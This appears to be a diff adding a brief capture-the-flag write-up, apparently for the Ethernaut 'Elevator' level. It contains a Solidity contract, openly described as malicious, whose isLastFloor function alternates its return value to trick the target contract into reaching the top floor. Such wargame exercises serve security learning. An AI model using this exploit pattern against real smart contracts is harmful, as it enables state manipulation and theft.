@@ -1,0 +1,20 @@
+1) I created a malicious contract with the function isLastFloor needed by the Elevator contract
+pragma solidity ^0.6.0;
+contract hackElevator{
+    Elevator elevator = Elevator(0x5652a06DdE0015437486f6F487243516CF9cc304);
+    bool public switcher = true;
+    function toTop() public{
+        elevator.goTo(1);
+    }
+    function isLastFloor(uint _level) public returns(bool){
+        if(switcher){
+            switcher = false;
+            return false;
+
+        }
+        else{
+            switcher = true;
+            return true;
+        }
+    }
+}
